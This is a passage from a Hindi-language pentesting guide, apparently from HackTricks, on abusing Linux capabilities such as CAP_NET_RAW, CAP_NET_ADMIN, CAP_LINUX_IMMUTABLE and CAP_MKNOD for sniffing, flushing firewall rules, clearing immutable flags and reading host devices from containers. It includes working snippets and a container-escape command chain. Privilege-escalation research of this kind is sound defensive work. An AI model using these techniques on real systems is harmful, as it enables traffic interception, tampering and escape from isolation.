[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) processes को **RAW और PACKET sockets बनाने** की अनुमति देता है, जिससे वे मनमाने network packets generate और send कर सकते हैं। इससे containerized environments में security risks उत्पन्न हो सकते हैं, जैसे packet spoofing, traffic injection और network access controls को bypass करना। Malicious actors इसका exploitation करके container routing में हस्तक्षेप कर सकते हैं या host network security को compromise कर सकते हैं, खासकर पर्याप्त firewall protections के अभाव में। इसके अतिरिक्त, **CAP_NET_RAW** RAW ICMP requests के माध्यम से ping जैसी operations को support करता है।<sup>[[14]](#references)</sup>

**यह उपयुक्त socket interface के साथ packet capture सक्षम कर सकता है।** यह सीधे तौर पर व्यापक privilege escalation प्रदान नहीं करता।<sup>[[14]](#references)</sup>

**Binary के साथ उदाहरण**

यदि binary **`tcpdump`** में यह capability है, तो आप इसका उपयोग network information capture करने के लिए कर सकेंगे।
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
यदि **environment** यह capability प्रदान करता है, तो **`tcpdump`** इसका उपयोग traffic sniff करने के लिए भी कर सकता है।<sup>[[14]](#references)</sup>

**binary 2 के साथ उदाहरण**

निम्नलिखित उदाहरण **`python2`** code है, जो "**lo**" (**localhost**) interface के traffic को intercept करने के लिए उपयोगी हो सकता है। यह code [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com) के "_The Basics: CAP-NET_BIND + NET_RAW_" lab से लिया गया है।<sup>[[1]](#references)</sup>
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) holder को **network configurations में बदलाव** करने की शक्ति देता है, जिसमें वर्तमान network namespace में firewall settings, routing tables, socket permissions और network interface settings शामिल हैं। यह उस namespace में किसी interface पर promiscuous mode भी enable कर सकता है; इससे उस interface तक पहुंचने वाला traffic exposed हो सकता है, लेकिन यह अपने-आप अन्य network namespaces में arbitrary interfaces को sniff करने की अनुमति नहीं देता।<sup>[[14]](#references)</sup>

ये operations process के **current network namespace** को प्रभावित करते हैं। Host network-state control के लिए `--network=host`, Kubernetes में `hostNetwork: true`, या कोई अलग namespace-entry primitive आवश्यक है। `CAP_NET_RAW` अकेले generic host shell नहीं है, लेकिन इसने एक documented, protocol-specific escape में भूमिका निभाई है: एक historical GCE chain में root, host network namespace, `CAP_NET_ADMIN`, `CAP_NET_RAW`, plaintext metadata traffic और raceable guest-agent request को मिलाकर SSH key inject की गई थी। पूरी prerequisites और modern HTTPS metadata caveats के लिए [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html) देखें।

**binary के साथ उदाहरण**

मान लेते हैं कि **python binary** में ये capabilities हैं।
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

**यह capability immutable और append-only जैसे inode flags को modify करने की अनुमति देती है।** यह सीधे तौर पर broader privilege escalation की अनुमति नहीं देती।<sup>[[14]](#references)</sup>

**Example with binary**

यदि आपको पता चलता है कि कोई file immutable है और python के पास यह capability है, तो आप **immutable attribute को हटा सकते हैं और file को modifiable बना सकते हैं:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
# Python code to remove the immutable flag and allow modifications
import fcntl
import os
import struct

FS_IMMUTABLE_FL = 0x00000010
FS_IOC_GETFLAGS = 0x80086601
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
flags = struct.unpack('i', fcntl.ioctl(fd, FS_IOC_GETFLAGS, struct.pack('i', 0)))[0]
fcntl.ioctl(fd, FS_IOC_SETFLAGS, struct.pack('i', flags & ~FS_IMMUTABLE_FL))
os.close(fd)

with open('/path/to/file.sh', 'a') as f:
f.write('New content for the file\n')
```
`FS_IOC_GETFLAGS` और `FS_IOC_SETFLAGS` operations inode flags को पढ़ते और अपडेट करते हैं; `FS_IMMUTABLE_FL` वह immutable flag है जिसे इस उदाहरण द्वारा clear किया जाता है।<sup>[[27]](#references)</sup>

> [!TIP]
> ध्यान दें कि आमतौर पर यह immutable attribute निम्नलिखित का उपयोग करके set और remove किया जाता है:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) `chroot(2)` system call के execution को सक्षम करता है, जिससे ज्ञात techniques के माध्यम से कमजोर तरीके से बनाए गए `chroot(2)` jail से escape किया जा सकता है।<sup>[[11]](#references)[[14]](#references)</sup>

यह **chroot-jail escape capability है, standalone container-to-host escape नहीं**। यह host filesystem को expose नहीं करता और न ही उसकी permissions को bypass करता है। यदि host root पहले से mounted है या `/proc/<pid>/root` के माध्यम से reachable है, तो `chroot()` केवल उस मौजूदा tree को process का pathname root बनाता है। अलग से, `setns(2)` के साथ mount namespaces बदलने के लिए caller के user namespace में `CAP_SYS_CHROOT` और `CAP_SYS_ADMIN` दोनों आवश्यक हैं, साथ ही उस user namespace में `CAP_SYS_ADMIN` भी आवश्यक है जो target mount namespace का owner है।<sup>[[14]](#references)</sup>

- [विभिन्न chroot solutions से बाहर निकलने का तरीका](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)।<sup>[[11]](#references)</sup>
- [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) system restarts के लिए `reboot(2)` system call के execution की अनुमति देता है, जिसमें `LINUX_REBOOT_CMD_RESTART2` जैसे commands शामिल हैं; यह नए या signed crash kernels को क्रमशः load करने के लिए `kexec_load(2)` और Linux 3.17 से `kexec_file_load(2)` को भी सक्षम करता है।<sup>[[14]](#references)</sup>

Private PID namespace के अंदर, supported `reboot()` request host को reboot करने के बजाय उस namespace के init process को terminate करती है। इसलिए host reboot का प्रभाव initial PID namespace के लिए आवश्यक है, जो सामान्यतः host PID sharing के माध्यम से होता है। kexec-based takeover के लिए अतिरिक्त रूप से compatible image, उपलब्ध syscall, तथा permissive lockdown और signature policy आवश्यक हैं। केवल capability को validate करने के लिए shared host पर इनमें से किसी operation को trigger न करें:
```bash
capsh --print | grep cap_sys_boot
readlink /proc/self/ns/pid /proc/1/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```
## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) को Linux 2.6.37 में व्यापक **CAP_SYS_ADMIN** से अलग किया गया था, जिससे विशेष रूप से `syslog(2)` call का उपयोग करने की क्षमता मिलती है। यह capability `/proc` और इसी तरह के interfaces के माध्यम से kernel addresses देखने की सुविधा देती है, जब `kptr_restrict` setting 1 पर हो, जो kernel addresses के exposure को नियंत्रित करती है। Linux 2.6.39 से `kptr_restrict` का default 0 है, जिसका अर्थ है कि kernel addresses exposed होते हैं, हालांकि कई distributions security reasons से इसे 1 (uid 0 को छोड़कर addresses hide करें) या 2 (हमेशा addresses hide करें) पर सेट करती हैं।<sup>[[14]](#references)</sup>

इसके अतिरिक्त, **CAP_SYSLOG** `dmesg_restrict` के 1 पर सेट होने पर `dmesg` output तक access की अनुमति देता है। इन बदलावों के बावजूद, historical precedents के कारण **CAP_SYS_ADMIN** में `syslog` operations करने की क्षमता बनी रहती है।<sup>[[14]](#references)</sup>

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) `mknod` system call की functionality को regular files, FIFOs (named pipes) या UNIX domain sockets बनाने से आगे बढ़ाता है। यह विशेष रूप से special files बनाने की अनुमति देता है, जिनमें शामिल हैं:<sup>[[14]](#references)</sup>

- **S_IFCHR**: Character special files, जो terminals जैसे devices होते हैं।
- **S_IFBLK**: Block special files, जो disks जैसे devices होते हैं।

यह capability उन processes के लिए उपयोगी है जिन्हें device files बनाने की आवश्यकता होती है, जिनमें character या block devices शामिल हैं।<sup>[[14]](#references)</sup>

यह Docker के documented default capability set में शामिल है; यह मानने के बजाय कि हर deployment समान defaults का उपयोग करता है, actual runtime configuration verify करें ([Moby default capability list](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19))।<sup>[[19]](#references)</sup>

Container escape के लिए, `CAP_MKNOD` किसी वास्तविक host device का missing handle बना सकता है, लेकिन यह underlying device create नहीं करता और device cgroup को bypass नहीं करता। Complete chain के लिए आवश्यक है:

1. Initial user namespace में effective `CAP_MKNOD`, क्योंकि device creation namespaced नहीं है।
2. किसी वास्तविक host device के लिए सही block या character type और major/minor numbers।
3. उस device को open करने की device-cgroup permission।
4. Compatible filesystem-aware reader, या block filesystem mount करने के लिए `CAP_SYS_ADMIN`।
5. Node create और use करने की filesystem तथा LSM permission।

किसी ext-family lab block device के लिए, जिसके वास्तविक major/minor numbers `252:1` हैं, read-only validation है:
```bash
mknod /dev/ht-node-root b 252 1
ls -l /dev/ht-node-root
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```
`/sys/class/block/<device>/dev` द्वारा रिपोर्ट किए गए numbers का उपयोग करें। यदि node बनाना सफल हो जाता है लेकिन इसे खोलने पर `Operation not permitted` मिलता है, तो device cgroup अभी भी access को block कर रहा है। यह उस container में सामान्य परिणाम है जिसमें Docker का default `CAP_MKNOD` तो है, लेकिन कोई explicit device allowance नहीं है।

एक अलग **two-foothold local privilege-escalation** technique भी है, जिसे direct container device access के साथ confuse नहीं करना चाहिए। ऐसा root process जो initial user namespace share करता है, container में block-device node बना सकता है, जबकि matching UID वाला host पर unprivileged shell उस node को `/proc/<container-pid>/root` के माध्यम से खोलता है। इसके बाद open का evaluation host shell के cgroup में होता है, इसलिए container का device-cgroup denial device को protect नहीं करता।<sup>[[7]](#references)</sup>

Container के अंदर node बनाएं और existing host foothold के UID के रूप में एक process को running रखें:
```bash
host_uid=1000 # Replace with the UID of the existing unprivileged host shell.
mknod /dev/ht-node-root b 252 1 # Replace with the real host device numbers.
chown "$host_uid" /dev/ht-node-root
chmod 600 /dev/ht-node-root
bridge_user=$(getent passwd "$host_uid" | cut -d: -f1)
if [ -z "$bridge_user" ]; then
useradd -u "$host_uid" -M htbridge
bridge_user=htbridge
fi
su -s /bin/sh "$bridge_user" -c 'sleep 600'
```
उस UID वाले मौजूदा host shell से sleeping container process का host PID पहचानें और device के path के रूप में उसके procfs root का उपयोग करें:
```bash
container_pid=<host-pid-of-the-matching-uid-process>
stat "/proc/${container_pid}/root/dev/ht-node-root"
debugfs -R 'cat /etc/hostname' "/proc/${container_pid}/root/dev/ht-node-root"
```
इस chain के लिए दोनों footholds, identity-mapped या shared user namespace, target `/proc/<pid>/root` को traverse करने की permission, सही major/minor numbers वाला वास्तविक device, और open की अनुमति देने वाला outer cgroup आवश्यक हैं। `hidepid`, ptrace-access rules, कोई LSM, filesystem incompatibility या user-namespace remapping इसे विफल कर सकते हैं। ऐतिहासिक technique का महत्व ठीक इसी कारण है कि यह समझाती है कि `/proc/<pid>/root` *container* के device-cgroup restriction को कैसे bypass कर सकता है; इसका अर्थ यह नहीं है कि `CAP_MKNOD` अकेले सामान्य रूप से isolated container से escape कर देता है।<sup>[[7]](#references)</sup>

### CAP_SETPCAP

file capabilities वाले वर्तमान Linux kernels पर, **`CAP_SETPCAP`** किसी thread को अपने bounding set से capabilities को अपने inheritable set में जोड़ने, अपने bounding set से capabilities हटाने और अपने securebits बदलने की अनुमति देता है। यह किसी process को मनमाने ढंग से दूसरे process को capabilities देने की अनुमति नहीं देता; यह behavior केवल file-capability support के बिना pre-2.6.25 kernels पर लागू होता है।<sup>[[14]](#references)</sup>

`capset()` system call किसी thread के अपने effective, permitted और inheritable sets को adjust कर सकती है, लेकिन नया permitted set मौजूदा permitted set से बाहर की capabilities को शामिल नहीं कर सकता और inheritable updates kernel constraints के अधीन रहते हैं।<sup>[[14]](#references)</sup>

## References

- [1] [AttackDefense (Pentester Academy) - Linux capabilities privilege escalation labs](https://attackdefense.pentesteracademy.com)
- [2] [Hacker's Grimoire - Privilege Escalation Linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [3] [Linux Container Basics: Capabilities](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [4] [Linux capabilities 101](https://linux-audit.com/linux-capabilities-101/)
- [5] [Taking Advantage of Linux Capabilities](https://www.linuxjournal.com/article/5737)
- [6] [Excessive Capabilities](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [7] [Abusing access to mount namespaces through /proc/pid/root](https://labs.reversec.com/posts/2020/06/abusing-access-to-mount-namespaces-through-procpidroot)
- [8] [Linux Capabilities: Why They Exist and How They Work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [9] [Understanding Capabilities in Linux](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
- [10] [PoC for bypassing seccomp if ptrace is allowed](https://gist.github.com/thejh/8346f47e359adecd1d53)
- [11] [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [12] [shocker.c - original CAP_DAC_READ_SEARCH Docker breakout exploit by Sebastian Krahmer](http://stealth.openwall.net/xSports/shocker.c)
- [13] [Docker breakout exploit analysis](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)
- [14] [capabilities(7) - Linux manual page](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [15] [proc_pid_status(5) - Linux manual page](https://man7.org/linux/man-pages/man5/proc_pid_status.5.html)
- [16] [pam_cap(8) - Linux manual page](https://man7.org/linux/man-pages/man8/pam_cap.8.html)
- [17] [capability.conf(5) - Ubuntu Manpage](https://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)
- [18] [systemd.exec(5) - Linux manual page](https://man7.org/linux/man-pages/man5/systemd.exec.5.html)
- [19] [Running containers - Docker Docs](https://docs.docker.com/engine/containers/run/)
- [20] [docker container run - Docker Docs](https://docs.docker.com/reference/cli/docker/container/run)
- [21] [cap_text_formats(7) - Linux manual page](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html)
- [22] [getpcaps(8) - Linux manual page](https://man7.org/linux/man-pages/man8/getpcaps.8.html)
- [23] [getcap(8) - Linux manual page](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [24] [amicontained](https://github.com/genuinetools/amicontained)
- [25] [setcap(8) - Linux manual page](https://man7.org/linux/man-pages/man8/setcap.8.html)
- [26] [capsh(1) - Linux manual page](https://man7.org/linux/man-pages/man1/capsh.1.html)
- [27] [ioctl_iflags(2) - Linux manual page](https://man7.org/linux/man-pages/man2/ioctl_iflags.2.html)
{{#include ../../banners/hacktricks-training.md}}
